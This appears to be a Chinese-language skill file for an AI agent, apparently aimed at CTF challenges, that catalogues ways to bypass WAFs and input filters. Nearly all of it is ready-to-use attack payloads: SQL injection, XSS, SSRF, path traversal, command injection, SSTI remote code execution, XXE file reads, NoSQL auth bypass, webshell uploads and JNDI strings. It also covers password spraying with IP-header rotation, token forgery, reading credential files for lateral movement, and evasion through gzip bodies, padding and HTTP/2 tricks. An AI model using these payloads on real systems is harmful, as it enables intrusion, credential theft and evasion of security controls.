---
name: muteki-waf-bypass
description: >
  Bypass WAF / gateway / charblock / keyword filters (403, 406, 501, 拦截,
  非法字符) while the backend still parses the request. Per-class mutations
  first (SQLi XSS SSRF LFI RCE SSTI XXE NoSQL upload deser), then generic
  carriers: Content-Type, charset, multipart, JSON/XML parser gaps, HPP,
  chunked, HTTP/2 delayed DATA, Content-Encoding gzip/deflate, encoding,
  path, oversize padding. One mutation at a time.
---

# WAF 与解析器差分绕过手册（门 ≠ 洞不存在）

403 / 406 / charblock / seqblock / 「非法字符」代表**前置门（WAF / 网关 / 预校验）**拦了字面特征，不代表后端已经参数化或漏洞不存在。
**保持原洞类不变，每次实验只改一个变量**，对比「被拦请求」与「无害基线请求」的状态码、响应头、Content-Length 和延迟差异。

```
被拦请求 vs 无害过门基线
  → 第一步：该漏洞类的语义等价变形（§1–§11），直到字面关键字不再触发
  → 第二步：通用载体与解析器差分（§G）：Payload 原样不动，换 Content-Type / JSON 重复键 / gzip 压缩体 / multipart 边界 / HTTP2 / 8KB 垫长
  → 第三步：通用字节与字符集编码（§G.6）
```

- **出口拦截 vs 浅层诱饵 Flag**：
  - 若漏洞原语已打通但回显被拦截，属于**出口通道拦截/涂改**——将读取结果在服务端 `base64` / `hex` 编码后再带出，避免响应体直接出现字面 `flag{`。
  - 若成功读出一个 `flag{...}` 但平台判定 `REJECTED`（`correct: false`），说明拿到的是**浅层诱饵（decoy）**而非最终机密层，应守在已打通的利用原语或继续向内网/特权层深挖，不要把被拒当成漏洞点错误。

---

## 0. 快速定位拦截层

| 观察现象 | 优先动作 |
|---|---|
| 字面路径 403，URL 编码或加 `/./` 后变 401/400/200 | §G.4 路径与归一化差分 |
| 请求体关键字 403，空参数或无害值 200 | 先试 §1–§11 类内变形，再试 §G.1 换 Content-Type / §G.3 `Content-Encoding: gzip` |
| JSON 顶层字段白名单/黑名单 403 | §G.1 JSON 重复键差分（首键放白名单过门，末键放真实值由 `json.loads` 生效） |
| 整段大请求过、短请求拦（或相反） | §G.3 前置垫 8KB/16KB 无害字段绕过 WAF 检查窗口 |
| 只有特定请求头或 User-Agent 触发 403/502 | §G.5 头名变形、UA 切换或路由分流探测 |
| HTTP/1.1 拦、HTTP/2 (`--http2` / `--http2-prior-knowledge`) 过 | §G.2 HTTP/2 拆帧或 `h2c` 独立上游 |
| 同一参数 GET 拦 POST 过（或相反） | 切换方法 / `X-HTTP-Method-Override` |

---

## 1. SQL 注入（SQLi）

常拦特征：`'`、`"`、`union`、`select`、`from`、`where`、`--`、`#`、`sleep`、`pg_sleep`、`information_schema`、空格。

**关键字拆分与空白替代**

| 手法 | 示例 |
|---|---|
| 块注释替空白 | `UN/**/ION/**/SE/**/LECT` |
| MySQL 内联注释 | `/*!UNION*/ /*!SELECT*/`、`/*!50000UNION*//*!50000SELECT*/` |
| 空白字符替代 | `%09`、`%0a`、`%0b`、`%0c`、`%0d`、`%a0`、`%00` |
| 括号消除空格 | `(1)and(1=1)`、`UNION(SELECT(1),2,3)` |
| 科学计数法粘连 | `1e0union`、`1.1union`、`2e-1select`、`1e0un/**/ion` |
| 行注释变体 | `--+`、`--%0a`、`%23`、`;%00` |

**等价逻辑与系统表替代**

| 被拦特征 | 替代写法 |
|---|---|
| `OR 1=1` / `AND 1=1` | `OR 2=2`、`OR 0x50=0x50`、`OR true`、`\|\|1`、`OR 1 IN (1)`、`OR 1 LIKE 1`、`OR 1 BETWEEN 0 AND 2` |
| `AND 0` | `AND 1*0`、`AND 1-1`、`AND nullif(1,1)` |
| `UNION SELECT NULL` | `UNION ALL SELECT`、`UNION DISTINCT SELECT`、`UNION SELECT 0` |
| `SLEEP` / `pg_sleep` | MySQL `BENCHMARK` / `GET_LOCK`；PG 笛卡尔积重查询或 `%bf` 前导字节绕过签名规则 |
| `information_schema` | MySQL `mysql.innodb_table_stats` / `sys.schemas`；SQLite `sqlite_master`；PG `pg_catalog.pg_class` / `pg_authid`（或 `pg_read_file('global/1260')`） |
| JSON SQL 函数 | MySQL `' OR JSON_LENGTH("{}")<=8896 UNION SELECT @@version#`；PG `(SELECT json_agg(t) FROM t)::text` |

**去引号与字节级绕过**

| 手法 | 示例 |
|---|---|
| 单/双/三重 URL 编码 | `%27`、`%2527`、`%252527`（注意检测 WAF 是否有 `NESTED-PCT` 规则） |
| JSON Unicode 转义 | `\u0027`、`\u0075\u006e\u0069\u006f\u006e` |
| 非法 UTF-8 前导字节 | **`%ff%27`、`%c0%27`、`%bf%27`**（直接发原始单字节，用来打断正则/字符串签名或触发宽字节吃转义） |
| Overlong UTF-8 | `%c0%a7`（代表 `'`） |
| `psql` / `libpq` 多字节逃逸 | `%c0%27%0a%5cr%0aSELECT+1,2,3;%0a%5cr%0a`（利用 `\r` 清空 `psql` 前序查询缓冲区；若 `FROM ` 带空格被拦或返空，改用 `\t` 替代空格如 `\tFROM\t`） |
| 无引号字符串构造 | MySQL `0x756e696f6e` / `CHAR(...)`；PG `CHR(47)\|\|CHR(101)...` / `$$...$$`；SQLite `CHAR(...)` |
| HPP / HPF 跨参数 | `id=1;select+1&id=2,3+from+users--` 或 `a=1+union/*&b=*/select+1,2` |
| PG 文件读与内网库横向 | 拿到 `pg_read_file` 后必查 `/var/lib/postgresql/` 家目录下的凭据文件（如 `vault_credentials.conf`、`.pgpass`、备份配置），提取口令后用 `dblink` 或 `COPY ... FROM PROGRAM 'PGPASSWORD=... psql -h <内网库> ...'` 横向读真 Flag |

- **全角/NFKC 归一化先验判定**：不要盲目测几十个全角字符。只需发送一个已知返回 True 的算式并将其中一个字符换成全角（如 `１=1`）或在 NUL 后放置全角黑名单字符，1 次请求即可确认后端是否先做 NFKC 归一化再过黑名单。

---

## 2. XSS（跨站脚本）

常拦特征：`<script`、`onerror`、`onload`、`javascript:`、`alert(`、`eval(`、`document.cookie`。需要真实浏览器触发时使用内置 `playwright-cli`。

| 维度 | 绕过写法 |
|---|---|
| 替换标签与事件 | `<svg/onload=alert(1)>`、`<img src=x onerror=alert(1)>`、`<details open ontoggle=alert(1)>`、`<video src=x onerror=alert(1)>`、`<body onload=alert(1)>` |
| 去括号/引号 | ``alert`1` ``、`confirm(1)`、`alert&lpar;1&rpar;`、`window['ale'+'rt'](1)`、`eval(atob('...'))`、`eval(String.fromCharCode(...))` |
| 属性内 HTML 实体 | `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`、`ja&#x76;ascript:`、`javascript&#58;` |
| 空白与分隔 | `<svg/onload=...>`、`<s%09cript>` |

---

## 3. SSRF（服务端请求伪造）

常拦特征：`127.0.0.1`、`localhost`、`0.0.0.0`、`file:`、`gopher:`、`169.254.169.254`、`::1`。断外网靶场严禁使用外部 DNS / Collaborator / Interactsh，只打本机或题目内网。

| 目标 | 等价变形 |
|---|---|
| `127.0.0.1` | `127.1`、`127.0.1`、`127.2.3.4`（`127.0.0.0/8` 全段环回）、`2130706433`（十进制）、`0x7f000001`、`0177.0.0.1`（八进制）、`0`、`0.0.0.0`、`[::1]`、`[::ffff:127.0.0.1]`、`[::ffff:7f00:1]` |
| URL 解析差分 | `http://expected-host@127.0.0.1/`、`http://127.0.0.1#@expected-host`、`http://127.0.0.1\` |
| Scheme 变形 | `file:///etc/passwd`、`file://localhost/etc/passwd`、`File://`、`gopher://127.0.0.1:6379/_...`、`dict://127.0.0.1:11211/` |
| 本地 302 跳转 | 若目标可控一处响应头或静态跳转，返回 `302 Location: http://127.0.0.1:...` 绕过初次 URL 检查 |

---

## 4. LFI / 路径穿越 / Wrapper 源码读取

常拦特征：`../`、`..\`、`/etc/passwd`、`php://`、`file://`、`data://`。

| 维度 | 绕过写法 |
|---|---|
| 穿越变形 | `%2e%2e%2f`、`%252e%252e%252f`、`..%2f`、`....//`、`..././`、`..;/`、`%c0%ae%c0%ae%c0%af` |
| Linux 进程自省路径 | `/proc/self/environ`、`/proc/self/cmdline`、`/proc/self/cwd/flag`、`/proc/self/fd/0..30`、`/run/secrets/flag` |
| PHP Wrapper 变形 | 大小写 `pHp://FilTer/convert.base64-encode/resource=index.php`；编码冒号 `php%3a//filter/...`；前缀穿越 `../../php://filter/...`；转码器 `string.rot13`、`zlib.deflate`、`convert.iconv.utf-8.utf-16`；无文件链 `php_filter_chain_generator` |
| 其它协议 | `php://input`、`data://text/plain;base64,...`、`phar://`、`zip://` |

---

## 5. 命令注入 / RCE

常拦特征：`;`、`|`、`&`、`` ` ``、`$()`、空格、`cat`、`ls`、`id`、`/etc/passwd`。

| 维度 | 绕过写法 |
|---|---|
| 分隔符替代 | `%0a`、`||`、`&&`、`&`、`;` |
| 空格替代 | `${IFS}`、`$IFS$9`、`%09`、`{cat,/flag}`、`cat</flag`、`cat<>/flag` |
| 命令词拆分与通配 | `ca''t`、`c"a"t`、`c\at`、`cat$@`、`/???/??t /???/??ss??`、`/bin/c?t` |
| 环境变量切片 | `${PATH:0:1}`（`/`）、`${LS_COLORS:10:1}` |
| 无管道编码执行 | `bash<<<$(base64 -d<<<Y2F0IC9mbGFn)`、`$0<<<$'\x69\x64'`、`$(printf '\x69\x64')` |

---

## 6. SSTI（服务端模板注入与受限求值器）

常拦特征：`{{`、`}}`、`${`、`__class__`、`__mro__`、`__globals__`、`request`、`config`、`.`、`[]`。

| 被拦特征 | 绕过写法 |
|---|---|
| 定界符 `{{` `}}` | 语句块 `{% print(...) %}`；或切换引擎定界符 `${...}`、`<%=...%>`、`{...}`、`*{...}` |
| 双下划线 `__` | 十六进制/Unicode 字符串 `'\x5f\x5fclass\x5f\x5f'`、`'\u005f\u005fclass\u005f\u005f'`；字符串拼接 `'__cl'+'ass__'` |
| 点号 `.` 与下标 `[]` | Jinja2 过滤器 `request\|attr('__class__')`、`|attr(request.args.k)` |
| 字面黑名单（不扫外参） | 将敏感词放入 Query/Header/Cookie：`{{request\|attr(request.args.a)\|attr(request.args.b)}}` 配合 `?a=__class__&b=__mro__`；或直接调用内置 **`fenjing`** 工具全自动绕过 Jinja2 黑名单 |
| Java Freemarker 识别与拆分 | 若 `${7*7}` 求值为 `49` 但 `[].length` / `title.length` 报语法错，立即测 `${'a'?upper_case}` / `${title?length}` 识别 **Freemarker**；用字符串拼接绕过黑名单：`${("free"+"marker.template.utility.Ex"+"ecute")?new()("sh -c ...")}`（若命令内 `cat /flag*` 被拦，改用 `sh -c` 配合 base64/八进制解码执行） |
| Python Bottle 行级指令触发 | 若 `{{7*7}}` 被原样输出/转义（常规算术探针被前置过滤忽略），测试 **Bottle SimpleTemplate 独立 `%` 代码行语法** 配合无斜杠 `chr()` 路径：`\n%import linecache\n{{linecache.getline(chr(47)+chr(102)+chr(108)+chr(97)+chr(103),1)}}` |
| 受限表达式/算术求值器 | 若确认是自定义 AST/算术求值器而非裸 JS/Python：先枚举上下文注入的内置变量名、利用字符串内插 `${...}` 二次展开或原型链/构造器属性，以及检查求值器与业务层的状态共享 |

---

## 7. XXE（XML 外部实体）

| 手法 | 示例 |
|---|---|
| 参数实体替代普通实体 | `<!ENTITY % e SYSTEM "file:///etc/passwd"> %e;` |
| PUBLIC 替代 SYSTEM | `<!ENTITY % xxe PUBLIC "x" "file:///etc/passwd">` |
| 实体/换行拆分声明 | `<!DOCTYPE foo [\n<!ENTITY\nxxe\nSYSTEM\n"file:///flag"\n]>`、`&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;` |
| 整段 UTF-16BE 双编码 | `iconv -f UTF-8 -t UTF-16BE` 发送请求体，配 `Content-Type: application/xml; charset=utf-16be`（WAF 按 ASCII 扫不到 `<!DOCTYPE`） |

---

## 8. NoSQL 注入、口令喷洒与 Token 伪造

| 手法 | 示例 |
|---|---|
| 算子替换 | `$ne` 被拦换 `$gt`、`{"$gt":""}`、`$gte`、`$nin`、`$exists`、`$regex` |
| URL 表单转 JSON 体 | 将 `user=admin&pass=x` 改为 `Content-Type: application/json` + `{"user":"admin","pass":{"$ne":null}}` |
| 查询数组注入 | `user[$ne]=1&pass[$ne]=1` |
| JSON 重复键 | `{"user":"guest","user":{"$ne":"guest"}}` |
| 限速登录与弱口令喷洒 | 注册关闭或仅邀请码时，先从公开文章/资料页收集已有用户名，用 `muteki-spray` + `/usr/share/wordlists/ctf-micro/passwords.txt`（含 RockYou Top 1000）配合每请求轮换 `X-Forwarded-For` / `X-Real-IP` 喷洒 |
| 短二进制/Base64 Token 结构拆解 | 遇到 16~24 字节不透明重置码或会话 Token（如 Base64/Hex）时，连续取两个样本解码为原始字节对比：常为 `4字节大端 user_id + 8字节时间戳 + 随机尾部`，修改前 4 字节即可遍历伪造 `user_id=1..10`；Flask Session 用内置 `flask-unsign` 验签/伪造 |

---

## 9. 文件上传

| 拦点 | 绕过写法 |
|---|---|
| `.php` 扩展名 | `.phtml`、`.php5`、`.phar`、`.php.`、`.php%00.jpg`、双扩展 `.jpg.php` |
| 文件头/内容检查 | `GIF89a` / `\x89PNG\r\n\x1a\n` 魔数前缀 + `<?=...?>` 短标签；UTF-16 编码 PHP；利用 `.user.ini` / `.htaccess` |
| Multipart 解析差分 | 双写 `filename="safe.jpg"; filename="shell.php"`、`filename*=` (RFC 2231)、在 `Content-Disposition` 折行或插 TAB |

---

## 10. 反序列化与 JNDI

- **PHP 反序列化**：
  - 若 `O:\d+:` 被正则拦截：检查是否支持 `base64` 包裹分支、或在长度数字前加 `+`（PHP 7.1 以前 `O:+4:"..."`）、或用 `C:`（实现了 `Serializable` 的类）、`a:` 数组包裹内层对象、PHP 引用 `R:`/`r:`、以及 `phpggc` 编码功能。
- **Java 反序列化 / Heapdump / JNDI**：
  - 使用内置 `/usr/local/bin/java8` 运行 `/opt/tools/ysoserial.jar`、`/opt/tools/marshalsec.jar`、`jdumpspider`、`heapdump-extract`（自动提取 ASCII 与 UTF-16LE/BE 字符串）、`rogue-jndi` 与 `ldaps-wrap`（为本地 LDAP 套 TLS）。
  - JNDI 字符串变形：`${${::-j}ndi:ldap://...}`、`${${lower:J}ndi:...}`、JSON `\u006a\u006e\u0064\u0069`。

---

## G. 通用载体与解析器差分（WAFFLED — Payload 原样不动，只换外层结构）

当类内变形仍被拦时，**不要改内层 Payload，改外层协议与载体结构**：

### G.1 Content-Type 与结构差分（最高优先级）
1. **互换 Content-Type**：同一接口尝试 `application/x-www-form-urlencoded` ↔ `application/json` ↔ `multipart/form-data` ↔ `application/xml` ↔ 不带 `Content-Type` 头 ↔ `text/plain`。
2. **JSON 重复键首末差分**：
   - 许多前置门（自定义检查器、正则或流式首键提取器）只检查顶层第一个同名键，而 Python `json.loads` / Go / Node 默认**取最后一个同名键**：
   - 示例：`{"$type": "AllowedSafeType", "$type": "TargetGadgetType"}` 或 `{"q": "harmless", "q": "malicious_payload"}`。
3. **JSON 位置敏感门绕过**：
   - 若门仅检查 JSON 的第一个 key，把非敏感字段放在第一位：`{"_pad": 1, "$type": "..."}`。
4. **Multipart RFC 2231 边界欺骗**：
   - `Content-Type: multipart/form-data; boundary=fake; boundary*0=real-; boundary*1=bound`（WAF 按 `fake` 切分看不到字段，后端拼出 `real-bound` 解析真实字段）。
   - 在前序 part 声明特殊 `charset`，或在 part 头加 `Content-Transfer-Encoding: base64`。

### G.2 压缩与检查窗口垫长（绕过未解压/定长流式 WAF）
1. **请求体压缩绕过（`Content-Encoding: gzip` / `deflate`）**：
   - 很多自定义 WAF / 反向代理中间件（如边缘 Lua/Python/Go 过滤器）直接扫描未解压的原始 `request.body`，而后端框架或内层网关会自动解压 `Content-Encoding: gzip`。
   - 用 Python `gzip.compress(raw_body)` 压缩请求体并附上 `Content-Encoding: gzip` 发送，可一键穿透所有明文字节规则！
2. **前置大字段垫长（8KB / 16KB / 64KB Window Bypass）**：
   - WAF 往往只扫描请求体前 N 字节（常见 4KB / 8KB / 16KB）。在 JSON 或表单最前面放一个 `"pad": "A" * 16384`，把真实 Payload 推到检查窗口之后。

### G.3 HTTP/1.1 分块与 HTTP/2 协议差分
1. **`Transfer-Encoding: chunked`**：将敏感关键字拆在两个 chunk 边界上（如 `5\r\nunio\r\n7\r\nn select\r\n0\r\n\r\n`），或带 chunk extension `5;ext=1\r\n...`。
2. **HTTP/2 拆帧与 `h2c` 路由分流**：
   - 使用 `curl --http2` 或 `curl --http2-prior-knowledge`（h2c 明文 HTTP/2）。在 Envoy / Istio / Nginx 多层网关架构中，`h2c` 或特定 `User-Agent` 往往绑定了独立的 upstream cluster！
   - 使用 Python `h2` 库先发 `HEADERS` 帧，延迟 200ms 再发 `DATA` 帧。
